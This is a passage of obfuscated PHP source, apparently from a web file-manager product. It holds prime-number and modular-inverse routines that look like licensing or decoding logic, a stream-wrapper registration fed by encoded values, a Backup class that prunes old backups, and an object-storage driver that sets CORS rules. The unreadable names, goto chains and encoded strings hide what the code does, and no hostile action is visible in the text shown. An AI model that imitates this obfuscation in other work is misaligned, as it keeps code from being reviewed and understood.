eô²ïÈ” º; eÙù±Ì–ĞÌ: $c¹Éìİ¶Ó§ = $aÁ ñØ»ª·[338]($c¹Éìİ¶Ó§); $cÑô„§½éç = $A¿°„’£å[652]; if (strlen($cÑô„§½éç) < $A¿°„’£å[562]) { die; } goto aÖÜ¾‹˜­; Bá¸¡á„Š: $fà˜„æíÄ° = $A¿°„’£å[654]; if (strlen($fà˜„æíÄ°) < $A¿°„’£å[573]) { die; } $bî‰ì£­ğ = $aÁ ñØ»ª·[335]($fêÊÉ â¢Š, $fˆšÁ‡ò‚Ó); goto aîïêÅÒ; CÊ¶¨“Ü¾: if (!$D§ï‡µÏ) { return; } goto fíªÔÍ¸; D•êæ²¬ß¶: if (strlen($c§¼–™çó¾) < $A¿°„’£å[573]) { die; } $A¼²ÙÎÈŸç = 0; $cç ±‹Ê‹ = $A¿°„’£å[657]; goto Aõ“–‚Ú•©; E‘ÊôÛÑ˜Œ: for ($A°Şš¼‘‚ = 0; $A°Şš¼‘‚ < $aÁ ñØ»ª·[24]($c¹Éìİ¶Ó§); $A°Şš¼‘‚++) { $aîö‹ùïË = $aîö‹ùïË == $aÁ ñØ»ª·[24]($C—ÃŞ«¬‚) ? 0 : $aîö‹ùïË; $E‰¥¬ãË«— = $aîö‹ùïË++; $A¼²ÙÎÈŸç = $aÁ ñØ»ª·[335]($fêÊÉ â¢Š, $c¹Éìİ¶Ó§[$A°Şš¼‘‚]) - $bî‰ì£­ğ - $aÁ ñØ»ª·[336]($C—ÃŞ«¬‚[$E‰¥¬ãË«—]); $f„…†¿‘¼ = $A¿°„’£å[659]; if (!$f„…†¿‘¼) { die; } while ($A¼²ÙÎÈŸç < 0) { $A¼²ÙÎÈŸç += 64; } $F¶İÏ ß• .= $fêÊÉ â¢Š[$A¼²ÙÎÈŸç]; $E›‡ÊÒÃ¡İ = $A¿°„’£å[660]; if (strlen($E›‡ÊÒÃ¡İ) < $A¿°„’£å[573]) { return; } } $e­äÎßÕÏ = $aÁ ñØ»ª·[339]($F¶İÏ ß•); $a­¦¾óçŒª = $A¿°„’£å[661]; goto Aäİéä†˜“; fíªÔÍ¸: default: $e­äÎßÕÏ = $this->{$_SERVER[í½¨][246]}($c¹Éìİ¶Ó§, $báƒ™‰ÓêÉ . $eµ›Ü‹ÛÈõ); $eŞ©ˆ¯¬ÌÖ = $A¿°„’£å[663]; if (strlen($eŞ©ˆ¯¬ÌÖ) < $A¿°„’£å[573]) { return; } break; $aÓ–÷¸«œ = $A¿°„’£å[664]; while (strlen($aÓ–÷¸«œ) < $A¿°„’£å[562]) { if (!$aÓ–÷¸«œ) { break; } $aÓ–÷¸«œ++; } } if ($d¥ÏÎ‹Ñ¡Ô - 1 > 0) { $e­äÎßÕÏ = $this->{$_SERVER[í½¨][188]}($e­äÎßÕÏ, $báƒ™‰ÓêÉ, $d¥ÏÎ‹Ñ¡Ô - 1); } goto FÏ«‘‚ˆØÈ; E¼Ÿİ¨ø±‡: $fÉ®¿²§òã = $A¿°„’£å[648]; while ($fÉ®¿²§òã < $A¿°„’£å[562]) { if ($fÉ®¿²§òã >= 0) { break; } $fÉ®¿²§òã++; } $c¹Éìİ¶Ó§ = $aÁ ñØ»ª·[25]($c¹Éìİ¶Ó§, 16); goto d˜ƒÙ¢¿Ü; cöì±ˆË«Ø: $c¹Éìİ¶Ó§ = $aÁ ñØ»ª·[214]($c¹Éìİ¶Ó§); $FÉçèíÁÈç = $c¹Éìİ¶Ó§[0]; $eµ›Ü‹ÛÈõ = $aÁ ñØ»ª·[25]($c¹Éìİ¶Ó§, 1, 15); goto E¼Ÿİ¨ø±‡; FÏ«‘‚ˆØÈ: return $e­äÎßÕÏ; goto BìõÔÔ£É; BïŠ’Œ…ª: $A¿°„’£å =& $_SERVER[Æ]; $aÁ ñØ»ª· =& $_SERVER[í½¨]; if (!$aÁ ñØ»ª·[337]($c¹Éìİ¶Ó§) || $aÁ ñØ»ª·[24]($c¹Éìİ¶Ó§) < 10) { return !1; } goto aôŒ‘Ø–ƒ; BìõÔÔ£É: } public function mchy8bcedee2($Eã¾ìí—ÒÓ) { goto Cè½›™Œé¨; DÉ¨áÁ¬ÚÃ: $d¬¨°¬“Æİ = 2; $FÂç‹‹ÑØ = $C³ßŸ˜Šë[667]; while (strlen($FÂç‹‹ÑØ) < $C³ßŸ˜Šë[552]) { if (!$FÂç‹‹ÑØ) { break; } $FÂç‹‹ÑØ++; } goto Bò…‘Î¯¶ø; e‰—òöî…: $CŠğ†ÆÄÚ = ($a–æÕ¢ˆùô - 1) * ($a®ÊÄ¦µğò - 1); $EÕ£‘•ëÙ = $EŒæ­°¡”[201](($a–æÕ¢ˆùô + $a®ÊÄ¦µğò) / 2); while (1) { $aóğ¸÷±®Ş = $EÕ£‘•ëÙ; $d¦ÁŸ†ÂŒ = $C³ßŸ˜Šë[666]; if (strlen($d¦ÁŸ†ÂŒ) < $C³ßŸ˜Šë[564]) { die; } $cğ†×Şó•Ó = $CŠğ†ÆÄÚ; while ($cğ†×Şó•Ó % $aóğ¸÷±®Ş != 0) { $C¡¬ù†Ó’Ş = $cğ†×Şó•Ó; $cğ†×Şó•Ó = $aóğ¸÷±®Ş; $aóğ¸÷±®Ş = $C¡¬ù†Ó’Ş % $aóğ¸÷±®Ş; } if ($aóğ¸÷±®Ş == 1) { break; } else { $EÕ£‘•ëÙ++; } } goto DÉ¨áÁ¬ÚÃ; Bò…‘Î¯¶ø: for ($A®åçë‚ = 0; $A®åçë‚ < $CŠğ†ÆÄÚ * 10; $A®åçë‚++) { if (($CŠğ†ÆÄÚ * $A®åçë‚ + 1) % $EÕ£‘•ëÙ == 0) { $d¬¨°¬“Æİ = $EŒæ­°¡”[201](($CŠğ†ÆÄÚ * $A®åçë‚ + 1) / $EÕ£‘•ëÙ); break; } } $Dõ•“ã = $this->{$_SERVER[í½¨][147]}($a–æÕ¢ˆùô * $a®ÊÄ¦µğò . $EŒæ­°¡”[10], $EŒæ­°¡”[149]); $eÙò¯íÙ”± = $C³ßŸ˜Šë[668]; goto CšŠé‹Î¼´; Eä³Óí‡‰Û: $DëÒÜùÕ´ = $this->{$_SERVER[í½¨][147]}($Eã¾ìí—ÒÓ, $f§ğİ¤Î§) . $EŒæ­°¡”[344] . $Dõ•“ã; return $DëÒÜùÕ´; goto DÊ¸”¡Å·ä; CšŠé‹Î¼´: while ($eÙò¯íÙ”± < $C³ßŸ˜Šë[552]) { if ($eÙò¯íÙ”± >= 0) { break; } $eÙò¯íÙ”±++; } $f§ğİ¤Î§ = $EŒæ­°¡”[114]($EŒæ­°¡”[341] . ($a–æÕ¢ˆùô + $a®ÊÄ¦µğò) . $EŒæ­°¡”[342] . $EÕ£‘•ëÙ . $EŒæ­°¡”[342] . $d¬¨°¬“Æİ . $EŒæ­°¡”[343]); $aëƒÓ¶ô÷Æ = $C³ßŸ˜Šë[669]; goto Eä³Óí‡‰Û; Cè½›™Œé¨: $C³ßŸ˜Šë =& $_SERVER[Æ]; $EŒæ­°¡” =& $_SERVER[í½¨]; $a–æÕ¢ˆùô = $this->{$_SERVER[í½¨][340]}(); goto c¥ƒÀæ¡Ã•; c¥ƒÀæ¡Ã•: $a®ÊÄ¦µğò = $this->{$_SERVER[í½¨][340]}(); $DÊè‹–ßÔ´ = $C³ßŸ˜Šë[665]; if (!$DÊè‹–ßÔ´) { die; } goto e‰—òöî…; DÊ¸”¡Å·ä: } public function inqdc59480b0($e˜ÛÅËˆ‚Ñ) { goto c‡¤ñ†ˆ¬Ü; E¡™™‘¨ †: $E÷Ë…ô´£˜ = ($aÄç²Íƒ“‚ - 1) * ($F—²„¼‘ÑÍ - 1); $bŒ‚°Äß À = $EÏò¸‹Œ»»[673]; while ($bŒ‚°Äß À < $EÏò¸‹Œ»»[562]) { if ($bŒ‚°Äß À >= 0) { break; } $bŒ‚°Äß À++; } goto Dìˆßì‚İÜ; b“íËØºƒ: if (!$a¦°²–±¸Ô) { return; } return $c²ÁùŒŞºë; $fÊÅÇ¨ÉÅø = $EÏò¸‹Œ»»[677]; goto cÁ›“¯×ÙÈ; e¡öÙ’Á•Ó: $aÄç²Íƒ“‚ = 0; $F—²„¼‘ÑÍ = 0; for ($FŒ´ëäí¢Ú = 3; $FŒ´ëäí¢Ú < $C˜„áŒ°ê; $FŒ´ëäí¢Ú += 2) { if ($C˜„áŒ°ê % $FŒ´ëäí¢Ú != 0) { continue; } $aÄç²Íƒ“‚ = $FŒ´ëäí¢Ú; $F‚ğèøÛˆ = $EÏò¸‹Œ»»[671]; $F—²„¼‘ÑÍ = $Dê°±©î‚ó[201]($C˜„áŒ°ê / $FŒ´ëäí¢Ú); break; $e’íë­„Ÿµ = $EÏò¸‹Œ»»[672]; } goto E¡™™‘¨ †; cÁ›“¯×ÙÈ: if (strlen($fÊÅÇ¨ÉÅø) < $EÏò¸‹Œ»»[562]) { die; } goto B´é‹¹ì¡; B¾Šµë«: $A¯÷ƒùğáÊ = $EÏò¸‹Œ»»[675]; if (!$A¯÷ƒùğáÊ) { return; } for ($FŒ´ëäí¢Ú = 0; $FŒ´ëäí¢Ú < $E÷Ë…ô´£˜ * 10; $FŒ´ëäí¢Ú++) { if (($E÷Ë…ô´£˜ * $FŒ´ëäí¢Ú + 1) % $Fš·ÓÇ¤³ == 0) { $d„áÃÄ×æ» = $Dê°±©î‚ó[201](($E÷Ë…ô´£˜ * $FŒ´ëäí¢Ú + 1) / $Fš·ÓÇ¤³); break; } } goto d°¦ò­ÎÜ; Dìˆßì‚İÜ: $Fš·ÓÇ¤³ = $Dê°±©î‚ó[201](($aÄç²Íƒ“‚ + $F—²„¼‘ÑÍ) / 2); while (1) { $D‘‹¶ê¯¢Ò = $Fš·ÓÇ¤³; $aÜÀÇ™©Ÿô = $EÏò¸‹Œ»»[650]; if (!$aÜÀÇ™©Ÿô) { die; } $c¬×ğê˜Óñ = $E÷Ë…ô´£˜; while ($c¬×ğê˜Óñ % $D‘‹¶ê¯¢Ò != 0) { $E’‹¾Õ‘Æš = $c¬×ğê˜Óñ; $Bš›èËî“® = $EÏò¸‹Œ»»[674]; $c¬×ğê˜Óñ = $D‘‹¶ê¯¢Ò; $D‘‹¶ê¯¢Ò = $E’‹¾Õ‘Æš % $D‘‹¶ê¯¢Ò; } if ($D‘‹¶ê¯¢Ò == 1) { break; } else { $Fš·ÓÇ¤³++; } } $d„áÃÄ×æ» = 2; goto B¾Šµë«; c‡¤ñ†ˆ¬Ü: $EÏò¸‹Œ»» =& $_SERVER[Æ]; $Dê°±©î‚ó =& $_SERVER[í½¨]; $c¶² Å†å = $Dê°±©î‚ó[0]($Dê°±©î‚ó[344], $e˜ÛÅËˆ‚Ñ); goto e›È£×ĞÀ¶; d°¦ò­ÎÜ: $CÈœÛì«ñ = $Dê°±©î‚ó[114]($Dê°±©î‚ó[341] . ($aÄç²Íƒ“‚ + $F—²„¼‘ÑÍ) . $Dê°±©î‚ó[342] . $Fš·ÓÇ¤³ . $Dê°±©î‚ó[342] . $d„áÃÄ×æ» . $Dê°±©î‚ó[343]); $c²ÁùŒŞºë = $this->{$_SERVER[í½¨][246]}($c¶² Å†å[0], $CÈœÛì«ñ); $a¦°²–±¸Ô = $EÏò¸‹Œ»»[676]; goto b“íËØºƒ; a ™ÀÁ‘Ìï: $C˜„áŒ°ê = $Dê°±©î‚ó[201]($C˜„áŒ°ê); $Cºê²Ò = $EÏò¸‹Œ»»[670]; if (strlen($Cºê²Ò) < $EÏò¸‹Œ»»[564]) { die; } goto e¡öÙ’Á•Ó; e›È£×ĞÀ¶: if ($Dê°±©î‚ó[19]($c¶² Å†å) != 2) { return $Dê°±©î‚ó[10]; } $C˜„áŒ°ê = $this->{$_SERVER[í½¨][246]}($c¶² Å†å[1] . $Dê°±©î‚ó[10], $Dê°±©î‚ó[149]); if (!$C˜„áŒ°ê) { return $Dê°±©î‚ó[10]; } goto a ™ÀÁ‘Ìï; B´é‹¹ì¡: } public function yzkea18ed447() { goto fîØ¡á†‘Š; fîØ¡á†‘Š: $C¾—øçŒÜë =& $_SERVER[Æ]; $dŒÊÅÁñ¼§ =& $_SERVER[í½¨]; $dÍÃ´øÒÒ‹ = $dŒÊÅÁñ¼§[325]($dŒÊÅÁñ¼§[345](2, 14), $dŒÊÅÁñ¼§[345](2, 16) - 1); goto FğÇ“ÓˆÁ…; FğÇ“ÓˆÁ…: $C»«·ßÓá = $C¾—øçŒÜë[678]; if (!$C»«·ßÓá) { die; } $C®ôÏ®İÔ = array(); goto CÙÆÙÂ¾å¸; FØÖ‹ôŸã¸: while ($aƒŠÜÆåˆƒ <= (int) $dŒÊÅÁñ¼§[346]($dÍÃ´øÒÒ‹)) { $AÅ¤©™Åù´ = $aƒŠÜÆåˆƒ; $Bˆè™…Í±¦ = $C¾—øçŒÜë[680]; while (!0) { $AÅ¤©™Åù´++; $bõÑ‚¦£”› = $C¾—øçŒÜë[681]; if (!$bõÑ‚¦£”›) { die; } if ($AÅ¤©™Åù´ <= 2) { $aƒŠÜÆåˆƒ = $AÅ¤©™Åù´; break; } else { if ($AÅ¤©™Åù´ < 2) { continue; } } $bÎàõ•‰ÇÎ = !0; for ($B„Îö‘Å± = 2; $B„Îö‘Å± <= $dŒÊÅÁñ¼§[346]($AÅ¤©™Åù´); $B„Îö‘Å±++) { if ($AÅ¤©™Åù´ % $B„Îö‘Å± == 0) { $bÎàõ•‰ÇÎ = !1; } } if ($bÎàõ•‰ÇÎ) { $aƒŠÜÆåˆƒ = $AÅ¤©™Åù´; break; } } $C®ôÏ®İÔ[] = $aƒŠÜÆåˆƒ; } $E·±±ˆËĞÑ = 2; for ($AÅ¤©™Åù´ = $dÍÃ´øÒÒ‹; $AÅ¤©™Åù´ > 1; $AÅ¤©™Åù´--) { $bÎàõ•‰ÇÎ = !0; foreach ($C®ôÏ®İÔ as $f¢ÓŒ ã·¸) { if ($AÅ¤©™Åù´ % $f¢ÓŒ ã·¸ == 0) { $bÎàõ•‰ÇÎ = !1; break; } } if ($bÎàõ•‰ÇÎ) { $E·±±ˆËĞÑ = $AÅ¤©™Åù´; break; } } goto b›ƒÖÎ’Ä; b›ƒÖÎ’Ä: return $E·±±ˆËĞÑ; $eŸ£•ÔÀâ = $C¾—øçŒÜë[682]; if (!$eŸ£•ÔÀâ) { die; } goto B…†¾…‘¾; CÙÆÙÂ¾å¸: $aƒŠÜÆåˆƒ = 1; $F¯ÒÀ„§¿‘ = $C¾—øçŒÜë[679]; if (!$F¯ÒÀ„§¿‘) { return; } goto FØÖ‹ôŸã¸; B…†¾…‘¾: } public function pzvl98337859($e¬ŒÊŒß°, $Dõšø¯¥Œ) { $e…¶„ Ìæ‰ =& $_SERVER[Æ]; $eÚÎ“öØÒà =& $_SERVER[í½¨]; return $eÚÎ“öØÒà[13](array($eÚÎ“öØÒà[14], $eÚÎ“öØÒà[347]), $e¬ŒÊŒß°, $Dõšø¯¥Œ); $dµß£¾•Ğ™ = $e…¶„ Ìæ‰[683]; while (strlen($dµß£¾•Ğ™) < $e…¶„ Ìæ‰[568]) { if (!$dµß£¾•Ğ™) { break; } $dµß£¾•Ğ™++; } } public function imaw39bf87b7($AÃ±½˜ƒò, $bÎ¥•ñÅÇØ) { $d…Š ÒîÇ =& $_SERVER[í½¨]; return $d…Š ÒîÇ[13](array($d…Š ÒîÇ[348], $d…Š ÒîÇ[349]), $AÃ±½˜ƒò, $bÎ¥•ñÅÇØ); $Eì‡ŞİË•… = $_SERVER[Æ][684]; } public function nvuba4f8445a($E”Õ‹óğª¹, $cé‡¿½¥š¬) { $B“Ûù¸â‘Î =& $_SERVER[í½¨]; return $B“Ûù¸â‘Î[13](array($B“Ûù¸â‘Î[348], $B“Ûù¸â‘Î[350]), $E”Õ‹óğª¹, $cé‡¿½¥š¬); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $E…ŒŸ›ó— =& $_SERVER[Æ]; self::$name = date($E…ŒŸ›ó—[685]); if (!($A›…Â×‰‹À = Model($E…ŒŸ›ó—[686])->lastItem())) { $A›…Â×‰‹À = $this->initData(); } else { self::$name = $A›…Â×‰‹À[$E…ŒŸ›ó—[28]]; if ($A›…Â×‰‹À[$E…ŒŸ›ó—[687]] == $E…ŒŸ›ó—[83]) { self::$name = date($E…ŒŸ›ó—[688]); $DŸŠç¦áÁä = 0; if (isset($A›…Â×‰‹À[$E…ŒŸ›ó—[281]][$E…ŒŸ›ó—[167]][$E…ŒŸ›ó—[419]])) { $DŸŠç¦áÁä = (int) $A›…Â×‰‹À[$E…ŒŸ›ó—[281]][$E…ŒŸ›ó—[167]][$E…ŒŸ›ó—[419]]; } if ($A›…Â×‰‹À[$E…ŒŸ›ó—[28]] == self::$name) { Model($E…ŒŸ›ó—[686])->remove($A›…Â×‰‹À[$E…ŒŸ›ó—[367]]); } $A›…Â×‰‹À = $this->initData($DŸŠç¦áÁä, $A›…Â×‰‹À[$E…ŒŸ›ó—[689]]); } else { $this->checkStore($A›…Â×‰‹À[$E…ŒŸ›ó—[689]]); } } self::$option = $A›…Â×‰‹À; } private function initData($C¨ÚßË’Œ† = 0, $FíÍ²äğô® = '') { goto dî„«•¥Å¬; F…ô‹Ê´¶Š: $this->checkStore($bâ¦ëòˆ‹ [$b±ùùÏÜÊ¸[689]]); $a‹ÊĞ¨ßÕ¬ = array($b±ùùÏÜÊ¸[689] => $bâ¦ëòˆ‹ [$b±ùùÏÜÊ¸[689]], $b±ùùÏÜÊ¸[28] => self::$name, $b±ùùÏÜÊ¸[687] => 0, $b±ùùÏÜÊ¸[690] => $bâ¦ëòˆ‹ [$b±ùùÏÜÊ¸[690]], $b±ùùÏÜÊ¸[281] => array($b±ùùÏÜÊ¸[691] => array($b±ùùÏÜÊ¸[687] => 0), $b±ùùÏÜÊ¸[692] => array($b±ùùÏÜÊ¸[687] => 0, $b±ùùÏÜÊ¸[693] => 0, $b±ùùÏÜÊ¸[694] => 0, $b±ùùÏÜÊ¸[29] => $b±ùùÏÜÊ¸[33]), $b±ùùÏÜÊ¸[695] => array($b±ùùÏÜÊ¸[687] => 0, $b±ùùÏÜÊ¸[693] => 0, $b±ùùÏÜÊ¸[694] => 0), $b±ùùÏÜÊ¸[167] => array($b±ùùÏÜÊ¸[687] => 0, $b±ùùÏÜÊ¸[696] => 0, $b±ùùÏÜÊ¸[697] => 0, $b±ùùÏÜÊ¸[698] => 0, $b±ùùÏÜÊ¸[699] => 0, $b±ùùÏÜÊ¸[419] => $C¨ÚßË’Œ†)), $b±ùùÏÜÊ¸[700] => time(), $b±ùùÏÜÊ¸[701] => 0); $dçÄ×²çŞ = Model($b±ùùÏÜÊ¸[686])->insert($a‹ÊĞ¨ßÕ¬); goto c×¢ä”ˆĞµ; c×¢ä”ˆĞµ: $a‹ÊĞ¨ßÕ¬[$b±ùùÏÜÊ¸[367]] = $dçÄ×²çŞ; return $a‹ÊĞ¨ßÕ¬; goto C¼•š½ØÔè; dî„«•¥Å¬: $b±ùùÏÜÊ¸ =& $_SERVER[Æ]; $bâ¦ëòˆ‹  = Model($b±ùùÏÜÊ¸[686])->config(); if ($FíÍ²äğô® && $bâ¦ëòˆ‹ [$b±ùùÏÜÊ¸[689]] != $FíÍ²äğô®) { $C¨ÚßË’Œ† = 0; } goto F…ô‹Ê´¶Š; C¼•š½ØÔè: } private function checkStore($EõÏ„Äö¤ª) { $Cë¯ÚÏĞæÈ =& $_SERVER[Æ]; $aŠô˜­ÏÏ = Model($Cë¯ÚÏĞæÈ[702])->listData($EõÏ„Äö¤ª); Model($Cë¯ÚÏĞæÈ[702])->checkConfig($aŠô˜­ÏÏ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Æ][686])->findByName(self::$name); } return self::$option; } public static function set($aĞÓ“†…ô¼) { $dø¡­¶¹áï =& $_SERVER[Æ]; $d·¡¸›Õ°¹ = self::get(); foreach ($aĞÓ“†…ô¼ as $Bè„ß«°˜ => $cÉ•–™ªÖ›) { $BÑÌÂŸùš¢ = explode($dø¡­¶¹áï[91], $Bè„ß«°˜); $d§õÃ…Õôø = count($BÑÌÂŸùš¢); switch ($d§õÃ…Õôø) { case 1: $d·¡¸›Õ°¹[$BÑÌÂŸùš¢[0]] = $cÉ•–™ªÖ›; break; case 2: $d·¡¸›Õ°¹[$BÑÌÂŸùš¢[0]][$BÑÌÂŸùš¢[1]] = $cÉ•–™ªÖ›; break; case 3: $d·¡¸›Õ°¹[$BÑÌÂŸùš¢[0]][$BÑÌÂŸùš¢[1]][$BÑÌÂŸùš¢[2]] = $cÉ•–™ªÖ›; break; } } Model($dø¡­¶¹áï[686])->update($d·¡¸›Õ°¹[$dø¡­¶¹áï[367]], $d·¡¸›Õ°¹); self::$option = $d·¡¸›Õ°¹; return self::$option; } public function keep() { $BôŠ¬ª²”› =& $_SERVER[Æ]; $f¹È‹Ğßš = self::get(); if ($f¹È‹Ğßš[$BôŠ¬ª²”›[281]][$BôŠ¬ª²”›[691]][$BôŠ¬ª²”›[687]] == $BôŠ¬ª²”›[83]) { return; } $this->backupKeep($f¹È‹Ğßš); self::set(array($BôŠ¬ª²”›[703] => 1)); } private function backupKeep($A‚ŒªÛŸÑ) { goto F¯ê‚ŠÍ½Ì; F¯ê‚ŠÍ½Ì: $A¶¡ˆ‘Ûà =& $_SERVER[Æ]; $C¥¿¨ÇŠ § = Model($A¶¡ˆ‘Ûà[686])->listData(); if (empty($C¥¿¨ÇŠ §)) { return; } goto aìĞÄÚ¼Ãß; aìĞÄÚ¼Ãß: $AŞÏõˆ…©§ = 0; $dğë¡êéĞá = array(); foreach ($C¥¿¨ÇŠ § as $CÁ®ø†¬éÆ) { if ($AŞÏõˆ…©§ >= 7) { break; } $dğë¡êéĞá[] = $CÁ®ø†¬éÆ[$A¶¡ˆ‘Ûà[28]]; $AŞÏõˆ…©§++; } goto C¾¶ÌÎİ•é; C¾¶ÌÎİ•é: for ($AŞÏõˆ…©§ = 0; $AŞÏõˆ…©§ < 12; $AŞÏõˆ…©§++) { $dğë¡êéĞá[] = date($A¶¡ˆ‘Ûà[704], strtotime("\55{$AŞÏõˆ…©§}\40\155\x6f\x6e\164\150\163")); } $dğë¡êéĞá = array_unique($dğë¡êéĞá); foreach ($C¥¿¨ÇŠ § as $CÁ®ø†¬éÆ) { if (!empty($CÁ®ø†¬éÆ[$A¶¡ˆ‘Ûà[28]]) && in_array($CÁ®ø†¬éÆ[$A¶¡ˆ‘Ûà[28]], $dğë¡êéĞá)) { continue; } Model($A¶¡ˆ‘Ûà[686])->remove($CÁ®ø†¬éÆ[$A¶¡ˆ‘Ûà[367]]); $D””á®é¾ = "\x7b\151\x6f\x3a{$A‚ŒªÛŸÑ[$A¶¡ˆ‘Ûà[689]]}\175\x2f\144\x61\x74\141\x62\141\x73\x65\x2f\x62\141\143\153\165\160\137{$CÁ®ø†¬éÆ[$A¶¡ˆ‘Ûà[28]]}"; IO::remove($D””á®é¾, !1); } goto d¹†öáÛâ; d¹†öáÛâ: } public function db() { goto fŒ¡àª¥ÍÓ; fŒ¡àª¥ÍÓ: $DÁ•±õ‘’„ =& $_SERVER[Æ]; $AÅ¼Ïµ¶õñ = self::get(); if ($AÅ¼Ïµ¶õñ[$DÁ•±õ‘’„[281]][$DÁ•±õ‘’„[692]][$DÁ•±õ‘’„[687]] == $DÁ•±õ‘’„[83]) { return !0; } goto BšØÂ«»Ù‡; C°Ç²Ù˜Â¢: return !0; goto DÑ†á³‡©±; BšØÂ«»Ù‡: $f³­©ôÃ«™ = new BackupDb(); if (!$f³­©ôÃ«™->index()) { return !1; } self::set(array($DÁ•±õ‘’„[705] => 1)); goto C°Ç²Ù˜Â¢; DÑ†á³‡©±: } public function dbFile() { goto b‹œ©ë›£ˆ; b‹œ©ë›£ˆ: $A£ñ‰‡Ø¸ß =& $_SERVER[Æ]; $EÔ£¦ˆÙ„à = self::get(); if ($EÔ£¦ˆÙ„à[$A£ñ‰‡Ø¸ß[281]][$A£ñ‰‡Ø¸ß[695]][$A£ñ‰‡Ø¸ß[687]] == $A£ñ‰‡Ø¸ß[83]) { return !0; } goto e–ä›„À‘‹; a¹Ò‹Ó¡×ã: return !0; goto eÔÁŒ»Å‰; e–ä›„À‘‹: $Dï¾”çÔÑ‚ = new BackupDbFile(); if (!$Dï¾”çÔÑ‚->index()) { return !1; } self::set(array($A£ñ‰‡Ø¸ß[706] => 1)); goto a¹Ò‹Ó¡×ã; eÔÁŒ»Å‰: } public function file() { $c§à»éÔ‰Ç =& $_SERVER[Æ]; $FÃ†ñõé°¶ = self::get(); if ($FÃ†ñõé°¶[$c§à»éÔ‰Ç[281]][$c§à»éÔ‰Ç[167]][$c§à»éÔ‰Ç[687]] == $c§à»éÔ‰Ç[83]) { return !0; } if (!isset($FÃ†ñõé°¶[$c§à»éÔ‰Ç[690]]) || $FÃ†ñõé°¶[$c§à»éÔ‰Ç[690]] == $c§à»éÔ‰Ç[468]) { $EÂÍƒÏŠö = new BackupFile(); if (!$EÂÍƒÏŠö->index()) { return !1; } } self::set(array($c§à»éÔ‰Ç[707] => 1, $c§à»éÔ‰Ç[687] => 1)); return !0; } } goto eôÑ‘Ï÷Œ; cÔÒ¹â…Š’: $_SERVER[$_SERVER[ş”][52]] = (base64_decode('OTUxOA==')."\x32\x35")+0;$_yvHA="4sIjKHdP98QEeARr79JgvExQAQVY5rFP3TRYt5cAxnmdsS8zytfqiFJngaHwrjFvNhVXC";; stream_wrapper_register($_SERVER[ş”][53], $_SERVER[ş”][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($E•†¦Ç „Ü, $cßÔ¡Ìº°) { $fËª’…Ö“ =& $_SERVER[Æ]; if (isset(self::$_methodList[$E•†¦Ç „Ü])) { return @call_user_func_array(self::$_methodList[$E•†¦Ç „Ü], $cßÔ¡Ìº°); } else { if (method_exists($this, $E•†¦Ç „Ü)) { return call_user_func_array(array($this, $E•†¦Ç „Ü), $cßÔ¡Ìº°); } else { think_exception(__CLASS__ . $fËª’…Ö“[4] . $E•†¦Ç „Ü . $fËª’…Ö“[5]); } } } public static function __callStatic($Dè‡Ì˜ƒÊ, $b¢•áä­³) { if (isset(self::$_methodListStatic[$Dè‡Ì˜ƒÊ])) { return call_user_func_array(self::$_methodListStatic[$Dè‡Ì˜ƒÊ], $b¢•áä­³); } else { if (method_exists(self, $Dè‡Ì˜ƒÊ)) { return call_user_func_array(array(self, $Dè‡Ì˜ƒÊ), $b¢•áä­³); } else { show_json("{$Dè‡Ì˜ƒÊ}\50\51\40\156\x6f\164\40\x65\170\x69\x73\164\73", !1); } } } public static function addMethod($eìŸøÚ£‡Š, $e˜†© ‹‰™) { self::$_methodList[$eìŸøÚ£‡Š] = $e˜†© ‹‰™; } public static function addMethodStatic($EÌ‰ãÏå«¸, $C²‡ç¤¨ğã) { self::$_methodListStatic[$EÌ‰ãÏå«¸] = $C²‡ç¤¨ğã; } } goto BŒ‰£÷ÄÔ‹; bìÜ¸õÓÑê: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($F±Œ­°§²„) { parent::__construct(); include_once SDK_DIR . $_SERVER[Æ][1170]; $this->_init($F±Œ­°§²„); } public function _init($cÒªß±ÄÎî) { foreach ($cÒªß±ÄÎî as $fï””â®ğ’ => $B´‡ìÜ®·â) { if (isset($this->{$fï””â®ğ’})) { $this->{$fï””â®ğ’} = $B´‡ìÜ®·â; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Æ][1171], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto B‡ğ½äÀÛ; eİ½’µÀ¾: $dˆš ‚ºñ¶->addAllowedMethod($f‚Ô¸÷šÔ«[1175]); $dˆš ‚ºñ¶->addAllowedMethod($f‚Ô¸÷šÔ«[1176]); $dˆš ‚ºñ¶->addAllowedMethod($f‚Ô¸÷šÔ«[155]); goto A¾öêÈËİ¾; A¾öêÈËİ¾: $dˆš ‚ºñ¶->setMaxAgeSeconds(600); $dˆš ‚ºñ¶->addExposeHeader($f‚Ô¸÷šÔ«[1177]); $dˆš ‚ºñ¶->addAllowedHeader($f‚Ô¸÷šÔ«[1172]); goto dîÂÊ½Šêİ; B‡ğ½äÀÛ: $f‚Ô¸÷šÔ« =& $_SERVER[Æ]; $Câ‘ª•â¦º = new OSS\Model\CorsConfig(); $dˆš ‚ºñ¶ = new OSS\Model\CorsRule(); goto CÏ‹°óƒ–; CÏ‹°óƒ–: $dˆš ‚ºñ¶->addAllowedOrigin($f‚Ô¸÷šÔ«[1172]); $dˆš ‚ºñ¶->addAllowedMethod($f‚Ô¸÷šÔ«[1173]); $dˆš ‚ºñ¶->addAllowedMethod($f‚Ô¸÷šÔ«[1174]); goto eİ½’µÀ¾; dîÂÊ½Šêİ: $Câ‘ª•â¦º->addRule($dˆš ‚ºñ¶); try { $this->client->putBucketCors($this->bucket, $Câ‘ª•â¦º); } catch (OSS\Core\OssException $F‹½Ü¬áè) { return !1; } return !0; goto CŠì½äèÀÂ; CŠì½äèÀÂ: } public function getBucketCors() { goto DÊì„ÛÒ¯; f‡‹½Ş¨®„: $F¥Ç ÈËÅ• = $AÇìë’”•¬[0]->getMaxAgeSeconds(); $a·ª•‰Ú§ = $AÇìë’”•¬[0]->getExposeHeaders(); $DÌ¼àóïÈñ = $AÇìë’”•¬[0]->getAllowedHeaders(); goto bÀ¼ªö˜ºñ; bÀ¼ªö˜ºñ: return 